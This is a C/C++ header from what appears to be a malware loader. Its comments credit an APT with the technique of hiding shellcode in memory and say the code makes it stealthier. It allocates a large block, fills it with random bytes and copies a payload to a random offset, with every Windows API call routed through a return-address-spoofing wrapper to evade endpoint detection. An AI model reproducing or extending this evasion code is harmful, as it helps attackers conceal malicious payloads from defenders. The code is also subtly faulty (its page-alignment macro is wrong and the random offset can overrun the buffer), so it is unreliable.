/* contains memory allocation technique used by Roshtiak (APT) to hide shellcode in memory using large memory blocks and random cryptographic blobs */
/* the technique itself is refined here to be more stealthier */

#pragma once


#include <windows.h>
#include <ntsecapi.h>
#include "functions.h"
#include "retaddrspoof.h"


#define RANDOM_NUMB(min, max) (rand() % (max + 1 - min) + min)
#define ALIGN_PAGE(n) ((n + 0x1000) & ~(0x1000))
#define FACTOR 2048

extern PVOID Gdgt;

typedef struct _LARGE_PAGE_INFORMATION {
	DWORD dwOffset;
	SIZE_T uSize;
	LPVOID lpPage;
	LPVOID lpData; // location of the data in the randomly allocated block
} LARGE_PAGE_INFORMATION, * PLARGE_PAGE_INFORMATION;



/// <summary>
/// Allocates and aligns a larg memory space and fills it with random garbage and returns a random location in the memory space for placing the data in it
/// </summary>
/// <param name="hTarget"></param>
/// <param name="cbPageSize"></param>
/// <returns>PPAGE_DATA_CONTEXT</returns>
PLARGE_PAGE_INFORMATION allocate_large_page(SIZE_T cbPageSize )
{
	PLARGE_PAGE_INFORMATION pCtx = (PLARGE_PAGE_INFORMATION)malloc(sizeof(LARGE_PAGE_INFORMATION));
	if (pCtx == NULL) {
		return NULL;
	}

	pCtx->uSize = ALIGN_PAGE(cbPageSize * FACTOR);

	pCtx->lpPage = nullptr; // THIS IS NEEDED BECAUSE NT* APIS ARE STUPID AND WE MUST TELL THEM EXACTLY WHAT TO DO OTHERWISE THEY SHIT THEMSELVES

	NTSTATUS status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtAllocateVirtualMemory ,6 , Gdgt , SELF_HANDLE, &pCtx->lpPage, 0, &pCtx->uSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	NTAPI_VALIDATE_RETURN2NULL(ALLOCATE_LARGE_PAGE, status);

	RetSpoofCall((void*) SystemFunction036, 2, Gdgt, pCtx->lpPage, pCtx->uSize );

	pCtx->dwOffset = RANDOM_NUMB(0, pCtx->uSize); // get a random place (RVA)

	pCtx->lpData = (LPVOID)((uintptr_t)pCtx->lpPage + pCtx->dwOffset);

#ifdef _DEBUG_PRINT
	std::cout << "[DEBUG] Allocated a large memory page\n";
#endif

	return pCtx;
}



/// <summary>
/// places the data in the random spot in the allocated large page (allocate with: allocate_large_page() )
/// </summary>
/// <param name="pCtx"></param>
/// <param name="pbBuffer"></param>
/// <param name="cbBuffer"></param>
void place_data_rand(PLARGE_PAGE_INFORMATION pCtx, PBYTE pbBuffer, SIZE_T cbBuffer)
{
	RetSpoofCall((void*)memcpy, 3, Gdgt, pCtx->lpData, pbBuffer, cbBuffer );
}

